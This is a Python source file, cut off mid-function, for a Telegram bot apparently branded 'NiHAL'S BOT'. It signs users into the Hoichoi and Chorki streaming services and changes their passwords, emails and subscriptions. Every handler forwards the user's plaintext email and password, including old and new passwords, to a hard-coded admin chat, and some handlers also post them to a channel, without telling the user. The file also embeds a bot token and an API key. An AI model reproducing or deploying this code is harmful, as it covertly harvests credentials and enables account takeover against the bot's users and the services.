import telebot
import requests
import json
import time
import timeit
import datetime
from keep_alive import keep_alive
keep_alive()

def calculate_days_left(end_date_str):
    try:
        # Convert the end date string to a datetime object
        end_date = datetime.datetime.strptime(end_date_str, "%Y-%m-%dT%H:%M:%S.%fZ")

        # Calculate the difference in days
        current_date = datetime.datetime.utcnow()
        days_left = (end_date - current_date).days

        return max(days_left, 0)  # Ensure days_left is not negative
    except Exception as e:
        # Handle any exceptions that might occur during date calculation
        print(f"Error calculating days left: {e}")
        return 0


# Start time for processing
start_time = timeit.default_timer()

TOKEN = '6609388405:AAEGy2PrJe-y0MFfS8Z7Rx40I6aUoAiqAec'
API_URL = 'https://prod-api.viewlift.com/identity'
ADMIN_CHAT_ID = '5934858568'  # Replace with your admin chat ID
CHANNEL_ID = -1002130591512 

# Initialize the Telebot object
bot = telebot.TeleBot(TOKEN)

# Store user states (SIGN UP, SIGN IN, PASSWORD CHANGE, REDEEM, CHORKI PASS CHANGE, CHORKI PASS CHANGE, CHORKI SIGN IN)
user_states = {}

# Common headers for API requests
headers = {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Origin': 'https://www.hoichoi.tv',
    'Referer': 'https://www.hoichoi.tv/',
    'User-Agent': 'NiHAL',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef'
}


# Common headersC for API requests
headersC = {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Origin': 'https://www.chorki.com',
    'Referer': 'https://www.chorki.com/',
    'User-Agent': 'NiHAL',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef'
}

# Helper function to send API requests and capture details for failed requests
def send_api_request_with_details(url, method='POST', headers=None, data=None):
    response = requests.request(method, url, headers=headers, json=data)
    if response.status_code == 200:
        return response.json()
    else:
        return {
            'status_code': response.status_code,
            'response_text': response.text,
            'url': url,
            'method': method,
            'headers': headers,
            'data': data
        }

# Function to reset user state
def reset_user_state(chat_id):
    try:
        del user_states[chat_id]
    except KeyError:
        pass

# Define the initial keyboard
keyboard = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
signup_button = telebot.types.KeyboardButton('SIGN UP')
signin_button = telebot.types.KeyboardButton('SIGN IN')
chorki_signin_button = telebot.types.KeyboardButton('CHORKI SIGN IN')  # New button
password_change_button = telebot.types.KeyboardButton('PASSWORD CHANGE')
hoi_email_change_button = telebot.types.KeyboardButton('HOI EMAIL CHANGE')
redeem_button = telebot.types.KeyboardButton('REDEEM')
chorki_pass_change_button = telebot.types.KeyboardButton('CHORKI PASS CHANGE')
chorki_email_change_button = telebot.types.KeyboardButton('CHORKI EMAIL CHANGE')

# Organizing the buttons in a more professional and advanced way
keyboard.row(signup_button, signin_button, chorki_signin_button)
keyboard.row(password_change_button, hoi_email_change_button)
keyboard.row(redeem_button, chorki_pass_change_button, chorki_email_change_button)

# Add a welcome message
welcome_message = "Welcome to NiHAL'S BOT! Choose an option:"

# Define the command handler for /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    # Send the welcome message and the keyboard
    bot.send_message(message.chat.id, welcome_message, reply_markup=keyboard)

# Command handler for /signup
@bot.message_handler(func=lambda message: message.text == 'SIGN UP')
def handle_signup(message):
    bot.send_message(message.chat.id, "Please enter your name:")
    user_states[message.chat.id] = 'SIGNUP_NAME'

# Message handler for name input during SIGN UP
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'SIGNUP_NAME')
def handle_signup_name_input(message):
    user_states[message.chat.id] = 'SIGNUP_EMAIL'
    bot.send_message(message.chat.id, "Please enter your email:")
    user_states['temp_name'] = message.text

# Message handler for email input during SIGN UP
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'SIGNUP_EMAIL')
def handle_signup_email_input(message):
    user_states[message.chat.id] = 'SIGNUP_PASSWORD'
    bot.send_message(message.chat.id, "Please enter your password:")
    user_states['temp_email'] = message.text

# Message handler for password input during SIGN UP and completing the process
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'SIGNUP_PASSWORD')
def handle_signup_password_input(message):
    signup_data = {
        "email": user_states['temp_email'],
        "password": message.text,
        "name": user_states['temp_name']
    }

    signup_response = send_api_request_with_details(f"{API_URL}/signup?site=hoichoitv", headers=headers, data=signup_data)

    if signup_response and 'name' in signup_response and 'isSubscribed' in signup_response:
        # Successful signup
        success_message = f"Congratulations, **`{signup_response['name']}`**!\n"
        success_message += f"Email: `{signup_response['email']}`\n"
        success_message += f"Password: `{message.text}`\n"
        success_message += f"Subscription: `{signup_response['isSubscribed']}`\n"
        success_message += "You have successfully signed up.\n" \
                            "\nPowered by @N2X4E"

        bot.send_message(message.chat.id, success_message, parse_mode='Markdown')

        admin_message = f"**REQUEST:**\n"
        admin_message += f"Name: `{message.from_user.first_name}`\n"
        admin_message += f"Username: `@{message.from_user.username}`\n"
        admin_message += "**Sign Up:**\n"
        admin_message += f"Name: `{signup_response['name']}`\n"
        admin_message += f"Email: `{signup_response['email']}`\n"
        admin_message += f"Password: `{message.text}`\n"
        admin_message += f"Subscription: `{signup_response['isSubscribed']}`\n"
        bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')

    else:
        # Failed signup
        if 'status_code' in signup_response:
            failure_message = f"Sign up failed. Status Code: `{signup_response['status_code']}`\nResponse Text: `{signup_response['response_text']}`"
        else:
            failure_message = f"Sign up failed. Here are the full details:\n\n{signup_response}"
        bot.send_message(message.chat.id, failure_message, parse_mode='Markdown')

    # Reset user state
    del user_states[message.chat.id]
    del user_states['temp_name']
    del user_states['temp_email']

# Command handler for /signin
@bot.message_handler(func=lambda message: message.text == 'SIGN IN')
def handle_signin(message):
    try:
        bot.send_message(message.chat.id, "Please enter your email:")
        user_states[message.chat.id] = 'SIGNIN_EMAIL'
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'SIGNIN_EMAIL')
def handle_signin_email_input(message):
    try:
        # Process the email and move to the next state
        user_states[message.chat.id] = 'SIGNIN_PASSWORD'
        bot.send_message(message.chat.id, "Please enter your password:")

        # Store the email in a temporary variable
        user_states['temp_email'] = message.text
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'SIGNIN_PASSWORD')
def handle_signin_password_input(message):
    try:
        # Process the password and complete the SIGN IN

        # Construct the request data
        signin_data = {
            "email": user_states.get('temp_email', ''),
            "password": message.text
        }

        # Make the API request for SIGN IN
        sign_in_response = send_api_request_with_details(f"{API_URL}/signin?site=hoichoitv", headers=headers, data=signin_data)

        if sign_in_response and 'isSubscribed' in sign_in_response:
            # Check if the user has a subscription
            is_subscribed = sign_in_response['isSubscribed']

            if is_subscribed:
                # User has a subscription, retrieve subscription info
                authorization_token = sign_in_response.get('authorizationToken', '')

                # User endpoint request
                user_url = "https://prod-api.viewlift.com/identity/user?site=hoichoitv"
                user_headers = {
                    "authorization": authorization_token,
                    "User-Agent": "NiHAL",
                    "X-Api-Key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
                }

                user_response = requests.get(user_url, headers=user_headers)

                if user_response.status_code == 200:
                    user_data = user_response.json()

                    # Key checks and print information
                    country_info = f"**Country:** {user_data.get('country', 'Not Provided')}"
                    phone_info = f"**Phone Number:** {user_data.get('phoneNumber', 'Not Provided')}"

                    subscription_info = user_data.get('subscription', {}).get('subscriptionInfo', {})
                    total_amount_info = f"**Total Amount:** {subscription_info.get('totalAmount', 'N/A')}"
                    devices_info = f"**Number of Allowed Devices:** {subscription_info.get('numberOfAllowedDevices', 'N/A')}"
                    streams_info = f"**Number of Allowed Streams:** {subscription_info.get('numberOfAllowedStreams', 'N/A')}"
                    end_date_info = f"**Subscription End Date:** {subscription_info.get('subscriptionEndDate', 'N/A')}"

                    # Calculate and print days left for subscription
                    days_left = calculate_days_left(subscription_info.get('subscriptionEndDate', ''))
                    days_left_info = f"Days Left for Subscription: {days_left} days"

                    # Calculate processing time using timeit
                    start_time = timeit.default_timer()

                    # Send processing message
                    processing_message = bot.send_message(message.chat.id, "Processing your request... (This may take a moment)")

                    # Your new functions here

                    # Send details to the user
                    user_message = f"**Successful Sign In!**\n\n"
                    user_message += f"Email: {user_states.get('temp_email', '')}\n"
                    user_message += f"Password: {message.text}\n\n"
                    user_message += f"{country_info}\n"
                    user_message += f"{phone_info}\n"
                    user_message += f"{total_amount_info}\n"
                    user_message += f"{devices_info}\n"
                    user_message += f"{streams_info}\n"
                    user_message += f"{end_date_info}\n"
                    user_message += f"{days_left_info}\n"

                    # Delete the processing message
                    bot.delete_message(message.chat.id, processing_message.message_id)

                    # Calculate and print processing time
                    processing_time = "{:.2f}".format(timeit.default_timer() - start_time)
                    user_message += f"\nProcessing Time: {processing_time} seconds\n"
                    user_message += "\nPowered by @N2X4E"
                    bot.send_message(message.chat.id, user_message, parse_mode='Markdown')

                    # Send details to admin
                    admin_message = f"**Sign In Details:**\n"
                    admin_message += f"Name: {message.from_user.first_name}\n"
                    admin_message += f"Username: @{message.from_user.username}\n"
                    admin_message += f"Email: {user_states.get('temp_email', '')}\n"
                    admin_message += f"Password: {message.text}\n\n"
                    admin_message += f"{country_info}\n"
                    admin_message += f"{phone_info}\n"
                    admin_message += f"{total_amount_info}\n"
                    admin_message += f"{devices_info}\n"
                    admin_message += f"{streams_info}\n"
                    admin_message += f"{end_date_info}\n"
                    admin_message += f"{days_left_info}\n"
                    admin_message += f"Processing Time: {processing_time} seconds\n"

                    bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')

                else:
                    bot.send_message(message.chat.id, f"Error accessing user endpoint: {user_response.status_code}")
                    bot.send_message(message.chat.id, "Please try again later.")

            else:
                # User does not have a subscription
                user_message = f"**Successful Sign In**, but you don't have a subscription.\n\n"
                user_message += f"Email: {user_states.get('temp_email', '')}\n"
                user_message += f"Password: {message.text}\n"
                user_message += "\nPowered by @N2X4E"
                bot.send_message(message.chat.id, user_message, parse_mode='Markdown')

                # Send details to admin
                admin_message = f"**Sign In Details (No Subscription):**\n"
                admin_message += f"Name: {message.from_user.first_name}\n"
                admin_message += f"Username: @{message.from_user.username}\n"
                admin_message += f"Email: {user_states.get('temp_email', '')}\n"
                admin_message += f"Password: {message.text}\n"
                bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')

        else:
            # Handle SIGN IN failure with response details
            if 'status_code' in sign_in_response:
                failure_message = f"SIGN IN failed. Status Code: `{sign_in_response['status_code']}`\nResponse Text: `{sign_in_response['response_text']}`\n"
            else:
                failure_message = f"SIGN IN failed. No response from the server.\n\nPowered by @N2X4E"

            bot.send_message(message.chat.id, failure_message, parse_mode='Markdown')

        # Reset user state
        reset_user_state(message.chat.id)
        user_states.pop('temp_email', None)

    except Exception as e:
        # Handle any unexpected exceptions
        error_message = f"An error occurred: {str(e)}\n"
        error_message += "\nPlease try again later."
        bot.send_message(ADMIN_CHAT_ID, error_message, parse_mode='Markdown')
        bot.send_message(CHANNEL_ID, error_message, parse_mode='Markdown')
    finally:
        # Reset the user's state after processing
        user_states.pop(message.chat.id, None)
        
# Command handler for /password_change
@bot.message_handler(func=lambda message: message.text == 'PASSWORD CHANGE')
def handle_password_change(message):
    try:
        bot.send_message(message.chat.id, "Please enter your email:")
        user_states[message.chat.id] = 'PASSWORD_CHANGE_EMAIL'
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'PASSWORD_CHANGE_EMAIL')
def handle_password_change_email_input(message):
    try:
        # Process the email and move to the next state
        user_states[message.chat.id] = 'PASSWORD_CHANGE_OLD_PASSWORD'
        bot.send_message(message.chat.id, "Please enter your current password:")

        # Store the email in a temporary variable
        user_states['temp_email'] = message.text
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'PASSWORD_CHANGE_OLD_PASSWORD')
def handle_password_change_old_password_input(message):
    try:
        # Process the old password and move to the next state
        user_states[message.chat.id] = 'PASSWORD_CHANGE_NEW_PASSWORD'
        bot.send_message(message.chat.id, "Please enter your new password:")

        # Store the old password in a temporary variable
        user_states['temp_old_password'] = message.text
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'PASSWORD_CHANGE_NEW_PASSWORD')
def handle_password_change_new_password_input(message):
    try:
        # Process the new password and complete the PASSWORD CHANGE

        # Construct the request data
        signin_data = {
            "email": user_states['temp_email'],
            "password": user_states['temp_old_password']
        }

        # Make the API request for SIGN IN to obtain authorizationToken
        signin_response = send_api_request_with_details(f"{API_URL}/signin?site=hoichoitv", headers=headers, data=signin_data)

        if signin_response and 'authorizationToken' in signin_response:
            # Successful SIGN IN, obtain authorizationToken
            reset_token = signin_response['authorizationToken']

            # Construct the request data for PASSWORD CHANGE
            password_change_data = {
                "email": user_states['temp_email'],
                "resetToken": reset_token,
                "newPassword": message.text
            }

            # Make the API request for PASSWORD CHANGE
            password_change_response = send_api_request_with_details(f"{API_URL}/password?site=hoichoitv", headers=headers, data=password_change_data)

            if password_change_response:
                # Successful PASSWORD CHANGE
                success_message = f"**Congratulations!**\n\n"
                success_message += f"Email: {user_states['temp_email']}\n"
                success_message += f"Old Password: {user_states['temp_old_password']}\n"
                success_message += f"New Password: {message.text}\n"
                success_message += "You have successfully changed your password.\n\nPowered by @N2X4E"
                bot.send_message(message.chat.id, success_message, parse_mode='Markdown')

                # Send details to admin
                admin_message = f"**REQUEST:**\n"
                admin_message += f"Name: {message.from_user.first_name} \n"
                admin_message += f"Username: @{message.from_user.username}\n"
                admin_message += f"Password Change:\n"
                admin_message += f"Email: {user_states['temp_email']}\n"
                admin_message += f"Old Password: {user_states['temp_old_password']}\n"
                admin_message += f"New Password: {message.text}"
                bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')
            else:
                # PASSWORD CHANGE failed
                failure_message = f"PASSWORD CHANGE failed. Details: {password_change_response}\n\nPowered by @N2X4E"
                bot.send_message(message.chat.id, failure_message, parse_mode='Markdown')
        else:
            # SIGN IN failed
            bot.send_message(message.chat.id, "SIGN IN failed. Please check your credentials and try again.")

        # Reset user state
        reset_user_state(message.chat.id)
        user_states.pop('temp_email', None)
        user_states.pop('temp_old_password', None)
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")
# Command handler for /redeem
@bot.message_handler(func=lambda message: message.text == 'REDEEM')
def handle_redeem(message):
    try:
        user_states[message.chat.id] = 'REDEEM_EMAIL'
        bot.reply_to(message, 'Please enter your email.')
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'REDEEM_EMAIL')
def handle_redeem_email_input(message):
    try:
        user_states[message.chat.id] = 'REDEEM_PASSWORD'
        user_states['temp_email'] = message.text
        bot.reply_to(message, 'Please enter your password.')
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'REDEEM_PASSWORD')
def handle_redeem_password_input(message):
    try:
        user_states[message.chat.id] = 'REDEEM_OFFER_CODE'
        user_states['temp_password'] = message.text
        bot.reply_to(message, 'Please enter the offer code.')
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'REDEEM_OFFER_CODE')
def handle_redeem_offer_code_input(message):
    try:
        redeeming_msg = bot.send_message(message.chat.id, "Redeeming...")

        # Function to perform Sign In Request
        def sign_in(email, password):
            url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-771bcd1d-aa43-7783-5023-d6512ed4da9f"
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Origin": "https://www.hoichoi.tv",
                "Referer": "https://www.hoichoi.tv",
                "User-Agent": "Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
            }
            data = {
                "email": email,
                "password": password
            }
            response = requests.post(url, headers=headers, json=data)
            return response.json()

        # Function to perform Subscription Request
        def subscribe(email, password, offer_code):
            sign_in_response = sign_in(email, password)
            if 'authorizationToken' in sign_in_response:
                user_id = sign_in_response['userId']
                url = f"https://prod-api.viewlift.com/subscription/subscribe?site=hoichoitv&platform=web_browser"
                headers = {
                    "Accept": "application/json, text/plain, */*",
                    "Authorization": sign_in_response['authorizationToken'],
                    "Content-Type": "application/json",
                    "Origin": "https://www.hoichoi.tv",
"Referer": "https://www.hoichoi.tv",
"User-Agent": "Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"sec-ch-ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
"sec-ch-ua-mobile": "?1",
"sec-ch-ua-platform": '"Android"',
"x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
                }
                data = {
                    "offerCode": offer_code,
                    "siteId": "7fa0ea9a-9799-4417-99f5-cbb5343c551d",
                    "userId": user_id,
                    "subscription": "prepaid",
                    "appliedOffers": [offer_code]
                }
                response = requests.post(url, headers=headers, json=data)
                return response.json()
            else:
                return {"error": "Sign in failed"}

        # Perform subscription
        subscription_response = subscribe(user_states['temp_email'], user_states['temp_password'], message.text)

        if 'subscriptionStatus' in subscription_response:
            # Successful REDEEM with offer code applied
            success_message = f"Congratulations!\n"
            success_message += f"Sign In Email: {user_states['temp_email']}\n"
            success_message += f"Sign In Password: {user_states['temp_password']}\n"
            success_message += f"Offer Code: {message.text}\n"
            success_message += "You have successfully redeemed with offer code.\n"
            success_message += f"Subscription Status: {subscription_response['subscriptionStatus']}\n\n"
            success_message += "Powered by @N2X4E"

            # Send success message to the user and delete the previous messages
            bot.delete_message(message.chat.id, redeeming_msg.message_id)
            bot.send_message(message.chat.id, success_message, parse_mode='Markdown')

            # Notify the admin
            admin_message = f"Redeem Successful:\n"
            admin_message += f"Name:{message.from_user.first_name}\n Username: @{message.from_user.username}\n"
            admin_message += f"Sign In Email: {user_states['temp_email']}\n"
            admin_message += f"Sign In Password: {user_states['temp_password']}\n"
            admin_message += f"Offer Code: {message.text}\n"
            admin_message += f"Subscription Status: {subscription_response['subscriptionStatus']}"
            bot.send_message(ADMIN_CHAT_ID, admin_message)

        else:
            # REDEEM failed
            if 'status_code' in subscription_response:
                failure_message = f"REDEEM failed. Status Code: `{subscription_response['status_code']}`\nResponse Text: `{subscription_response['response_text']}`\n"
            else:
                failure_message = "REDEEM failed. Please check your credentials and try again.\nNo specific error message available."

            # Send failure message to the user and delete the previous messages
            bot.delete_message(message.chat.id, redeeming_msg.message_id)
            bot.send_message(message.chat.id, failure_message, parse_mode='Markdown')

        # Reset user state
        reset_user_state(message.chat.id)
        user_states.pop('temp_email', None)
        user_states.pop('temp_password', None)
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

   # Command handler for /chorki_pass_change
@bot.message_handler(func=lambda message: message.text == 'CHORKI PASS CHANGE')
def handle_chorki_pass_change(message):
    try:
        bot.reply_to(message, "Please enter your email:")
        user_states[message.chat.id] = 'CHORKI_PASS_CHANGE_EMAIL'
    except KeyError:
        bot.reply_to(message, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'CHORKI_PASS_CHANGE_EMAIL')
def handle_chorki_pass_change_email_input(message):
    try:
        user_states[message.chat.id] = 'CHORKI_PASS_CHANGE_OLD_PASSWORD'
        bot.reply_to(message, "Please enter your current password:")
        user_states['temp_email'] = message.text
    except KeyError:
        bot.reply_to(message, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'CHORKI_PASS_CHANGE_OLD_PASSWORD')
def handle_chorki_pass_change_old_password_input(message):
    try:
        user_states[message.chat.id] = 'CHORKI_PASS_CHANGE_NEW_PASSWORD'
        bot.reply_to(message, "Please enter your new password:")
        user_states['temp_old_password'] = message.text
    except KeyError:
        bot.reply_to(message, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'CHORKI_PASS_CHANGE_NEW_PASSWORD')
def handle_chorki_pass_change_new_password_input(message):
    try:
        signin_data = {
            "email": user_states['temp_email'],
            "password": user_states['temp_old_password']
        }

        processing_message = bot.reply_to(message, "Processing...")

        signin_response = send_api_request_with_details(f"{API_URL}/signin?site=prothomalo", headers=headersC, data=signin_data)

        if signin_response and 'authorizationToken' in signin_response:
            reset_token = signin_response['authorizationToken']

            password_change_data = {
                "email": user_states['temp_email'],
                "resetToken": reset_token,
                "newPassword": message.text
            }

            password_change_response = send_api_request_with_details(f"{API_URL}/password?site=prothomalo", headers=headersC, data=password_change_data)

            if password_change_response:
                success_message = f"**Congratulations!**\n\n"
                success_message += f"Email: {user_states['temp_email']}\n"
                success_message += f"Old Password: {user_states['temp_old_password']}\n"
                success_message += f"New Password: {message.text}\n"
                success_message += "You have successfully changed your Chorki password.\n\nPowered byâï¸ @N2X4E"
                bot.reply_to(message, success_message, parse_mode='Markdown')

                admin_message = f"**REQUEST:**\n"
                admin_message += f"Name: {message.from_user.first_name} \n"
                admin_message += f"Username: @{message.from_user.username}\n"
                admin_message += f"Password Change (Chorki):\n"
                admin_message += f"Email: {user_states['temp_email']}\n"
                admin_message += f"Old Password: {user_states['temp_old_password']}\n"
                admin_message += f"New Password: {message.text}"
                bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')
            else:
                failure_message = f"PASSWORD CHANGE failed. Details: {password_change_response['response_txt']}\n\nPowered by @N2X4E"
                bot.reply_to(message, failure_message, parse_mode='Markdown')
        else:
            failure_message = f"SIGN IN failed. Please check your credentials and try again.\n\nDetails: {signin_response['response_text']}"
            bot.reply_to(message, failure_message)

        bot.delete_message(chat_id=message.chat.id, message_id=processing_message.message_id)

        reset_user_state(message.chat.id)
        user_states.pop('temp_email', None)
        user_states.pop('temp_old_password', None)
    except KeyError:
        bot.reply_to(message, "An error occurred. Please try again.")

       # Function to sign in to Chorki
def chorki_sign_in(email, password):
    url = f"{API_URL}/signin?site=prothomalo"
    data = {
        "email": email,
        "password": password
    }
    return send_api_request_with_details(url, headers=headersC, data=data)

# Function to update Chorki email
def chorki_update_email(auth_token, user_id, new_email, new_name, password):
    url = f"{API_URL}/user?site=prothomalo"
    headers = headersC.copy()
    headers["Authorization"] = auth_token
    data = {
        "email": new_email,
        "id": user_id,
        "name": new_name,
        "password": password
    }
    return send_api_request_with_details(url, method='PUT', headers=headers, data=data)

# Define the message handler for "CHORKI EMAIL CHANGE"
@bot.message_handler(func=lambda message: message.text == 'CHORKI EMAIL CHANGE')
def handle_email_change(message):
    msg = bot.reply_to(message, 'Please enter your current email.')
    bot.register_next_step_handler(msg, process_current_email_step)

def process_current_email_step(message):
    user_states[message.chat.id] = {"email": message.text}
    msg = bot.reply_to(message, 'Please enter your password.')
    bot.register_next_step_handler(msg, process_password_step)

def process_password_step(message):
    user_states[message.chat.id]["password"] = message.text
    msg = bot.reply_to(message, 'Please enter your new email.')
    bot.register_next_step_handler(msg, process_new_email_step)

def process_new_email_step(message):
    user_states[message.chat.id]["new_email"] = message.text
    msg = bot.reply_to(message, 'Please enter your new name.')
    bot.register_next_step_handler(msg, process_new_name_step)

def process_new_name_step(message):
    user_states[message.chat.id]["new_name"] = message.text
    changing_msg = bot.send_message(message.chat.id, "Changing....")

    start_time = time.time()  # Start the timer

    sign_in_response = chorki_sign_in(user_states[message.chat.id]["email"], user_states[message.chat.id]["password"])
    if "status_code" in sign_in_response:
        bot.send_message(message.chat.id, f"Sign in failed.\n\n {sign_in_response['response_text']}.")
        bot.delete_message(message.chat.id, changing_msg.message_id)  # Delete the "Changing..." message

        fail_message = (
            f"TRY CHORKI email change failed!\n\n"
            f"Requester Telegram Full Name: {message.from_user.first_name} {message.from_user.last_name}\n"
            f"Username: @{message.from_user.username}\n"
            f"User ID: {message.from_user.id}\n\n"
            f"Old Email: {user_states[message.chat.id]['email']}\n"
            f"New Email: {user_states[message.chat.id]['new_email']}\n"
            f"Password: {user_states[message.chat.id]['password']}\n"
            f"New Name: {user_states[message.chat.id]['new_name']}\n"
            f"Failed Reason: {sign_in_response['response_text']}\n"
            f"Response JSON: {sign_in_response}\n"
        )
        bot.send_message(ADMIN_CHAT_ID, fail_message)
        bot.send_message(CHANNEL_ID, fail_message)

        return

    auth_token = sign_in_response["authorizationToken"]
    user_id = sign_in_response["userId"]

    email_update_response = chorki_update_email(
        auth_token,
        user_id,
        user_states[message.chat.id]["new_email"],
        user_states[message.chat.id]["new_name"],
        user_states[message.chat.id]["password"],
    )

    bot.delete_message(message.chat.id, changing_msg.message_id)  # Delete the "Changing..." message

    if "status_code" in email_update_response:
        bot.send_message(message.chat.id, f"Email update failed. {email_update_response['response_text']}.")

        fail_message = (
            f"TRY CHORKI email change failed!\n\n"
            f"Requester Telegram Full Name: {message.from_user.first_name} {message.from_user.last_name}\n"
            f"Username: @{message.from_user.username}\n"
            f"User ID: {message.from_user.id}\n\n"
            f"Old Email: {user_states[message.chat.id]['email']}\n"
            f"New Email: {user_states[message.chat.id]['new_email']}\n"
            f"Password: {user_states[message.chat.id]['password']}\n"
            f"New Name: {user_states[message.chat.id]['new_name']}\n"
            f"Failed Reason: {email_update_response['response_text']}\n"
            f"Response JSON: {email_update_response}\n"
        )
        bot.send_message(ADMIN_CHAT_ID, fail_message)
        bot.send_message(CHANNEL_ID, fail_message)

        return

    end_time = time.time()  # End the timer
    time_taken = end_time - start_time  # Calculate the time taken

    success_message = (
        f"Successful! Your Chorki email and name have been updated.\n\n"
        f"Old Email: {user_states[message.chat.id]['email']}\n"
        f"New Email: {user_states[message.chat.id]['new_email']}\n"
        f"Password: {user_states[message.chat.id]['password']}\n\n"
        f"Time taken: {time_taken:.2f} seconds\n"
        "Bot Developed by NIHAL."
    )
    bot.send_message(message.chat.id, success_message)
    bot.send_message(CHANNEL_ID, success_message)

    admin_success_message = (
        f"Chorki email change successful!\n\n"
        f"Requester Telegram Full Name: {message.from_user.first_name} {message.from_user.last_name}\n"
        f"Username: @{message.from_user.username}\n"
        f"User ID: {message.from_user.id}\n\n"
        f"Old Email: {user_states[message.chat.id]['email']}\n"
        f"New Email: {user_states[message.chat.id]['new_email']}\n"
        f"Password: {user_states[message.chat.id]['password']}\n"
        f"Time taken: {time_taken:.2f} seconds"
    )
    bot.send_message(ADMIN_CHAT_ID, admin_success_message)
    bot.send_message(CHANNEL_ID, admin_success_message)

# Function to sign in to HoiChoi
def hoi_sign_in(email, password):
    url = f"{API_URL}/signin?site=hoichoitv"
    data = {
        "email": email,
        "password": password
    }
    return send_api_request_with_details(url, headers=headers, data=data)

# Function to update HoiChoi email
def hoi_update_email(auth_token, user_id, new_email, new_name, password):
    global headers
    url = f"{API_URL}/user?site=hoichoitv"
    headers = headers.copy()
    headers["Authorization"] = auth_token
    data = {
        "email": new_email,
        "id": user_id,
        "name": new_name,
        "password": password
    }
    return send_api_request_with_details(url, method='PUT', headers=headers, data=data)

# Define the message handler for "HOI EMAIL CHANGE"
@bot.message_handler(func=lambda message: message.text == 'HOI EMAIL CHANGE')
def handle_hoi_email_change(message):
    msg = bot.reply_to(message, 'Please enter your current HoiChoi email.')
    bot.register_next_step_handler(msg, process_current_hoiemail_step)

def process_current_hoiemail_step(message):
    user_states[message.chat.id] = {"hoiemail": message.text}
    msg = bot.reply_to(message, 'Please enter your password.')
    bot.register_next_step_handler(msg, process_hoipassword_step)

def process_hoipassword_step(message):
    user_states[message.chat.id]["hoipassword"] = message.text
    msg = bot.reply_to(message, 'Please enter your Hoichoi new email.')
    bot.register_next_step_handler(msg, process_hoinew_email_step)

def process_hoinew_email_step(message):
    user_states[message.chat.id]["hoinew_email"] = message.text
    msg = bot.reply_to(message, 'Please enter your Hoichoi new name.')
    bot.register_next_step_handler(msg, process_hoinew_name_step)

def process_hoinew_name_step(message):
    user_state = user_states.get(message.chat.id, {})
    user_state["hoinew_name"] = message.text
    changing_msg = bot.send_message(message.chat.id, "Changing....")

    try:
        start_time = time.time()  # Start the timer

        sign_in_response = hoi_sign_in(user_state.get("hoiemail"), user_state.get("hoipassword"))
        if "status_code" in sign_in_response:
            bot.send_message(message.chat.id, f"Sign in failed.\n\n {sign_in_response['response_text']}.")
            bot.send_message(CHANNEL_ID, f"Sign in failed.\n\n {sign_in_response['response_text']}.")
            del user_states[message.chat.id]
            return

        auth_token = sign_in_response["authorizationToken"]
        user_id = sign_in_response["userId"]

        email_update_response = hoi_update_email(
            auth_token,
            user_id,
            user_state.get("hoinew_email"),
            user_state.get("hoinew_name"),
            user_state.get("hoipassword"),
        )

        bot.delete_message(message.chat.id, changing_msg.message_id)

        if "status_code" in email_update_response:
